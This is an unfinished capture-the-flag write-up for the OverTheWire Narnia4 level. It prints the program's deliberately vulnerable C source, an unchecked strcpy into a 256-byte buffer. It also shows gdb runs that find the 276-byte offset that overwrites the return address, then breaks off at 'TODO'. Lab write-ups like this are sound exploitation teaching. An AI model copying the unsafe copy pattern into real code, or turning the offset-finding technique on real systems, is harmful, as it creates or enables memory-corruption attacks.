#Narnia4

narnia.labs.overthewire.org

**Username:** narnia4
**Password:** see [narnia3](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria3)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Let's start out like we normally do and execute the application.
>
>```
# ./narnia4 
# ./narnia4 Test
# 
>```
>
> Well that's weird.  Let's see what we can gather from the source.
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
>
extern char **environ;
>
int main(int argc,char **argv){
	int i;
	char buffer[256];
>
	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
>
	if(argc>1)
		strcpy(buffer,argv[1]);
>
	return 0;
}
>```
>
> Ok, similiar to previous challenges we can see the character array ```char buffer[256];``` initialized and then used in ```strcpy(buffer,argv[1]);``` without checking the size of ```argv[1]```.  Let's go ahead start up gdb and poke around.
>
>```
(gdb) run $(python -c 'print "A"*100')
Starting program: /root/narnia4 $(python -c 'print "A"*100')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
[Inferior 1 (process 6557) exited normally]
(gdb) run $(python -c 'print "A"*200')
Starting program: /root/narnia4 $(python -c 'print "A"*200')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
[Inferior 1 (process 6560) exited normally]
(gdb) run $(python -c 'print "A"*300')
Starting program: /root/narnia4 $(python -c 'print "A"*300')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.
>
Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run $(python -c 'print "A"*275')
Starting program: /root/narnia4 $(python -c 'print "A"*275')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) c
Continuing.
>
Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run $(python -c 'print "A"*276')
Starting program: /root/narnia4 $(python -c 'print "A"*276')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
>```
>
> Ok, we saw our ```A``` when we submitted 300 of them.  After backing off to 275, we see 3 positions overwritten with ```A```.  Adding one to that looks like we have our magic number as it appears we have overwritten a return address successfully with ```0x41414141``` with 276 ```A```.
>
> TODO
